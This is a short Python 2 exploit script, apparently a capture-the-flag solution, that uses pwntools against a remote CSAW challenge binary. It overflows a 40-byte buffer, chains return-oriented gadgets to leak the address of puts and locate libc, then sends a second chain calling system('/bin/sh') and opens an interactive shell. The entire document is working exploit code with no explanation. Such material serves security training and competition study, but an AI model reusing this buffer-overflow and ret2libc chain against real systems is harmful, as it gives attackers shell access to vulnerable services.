from pwn import *
payload = 'A'*40
context.arch='amd64'
e = ELF('./rop')
libc = ELF('./libc-2.27.so')
#libc = e.libc
#p = process(e.path)
p = remote('pwn.chal.csaw.io', 5016)
payload = 'A'*40
r = ROP(e)
r.puts(e.got['puts'])
r.main()
payload += r.chain()
p.recvline()
p.sendline(payload)
leak = u64(p.recv(6).ljust(8,'\x00'))
libc.address = leak-libc.symbols['puts']
print hex(libc.address)
r = ROP(libc)
r.system(libc.search('/bin/sh').next())
payload = 'A'*40 + r.chain()
p.recvline()
p.sendline(payload)
p.interactive()
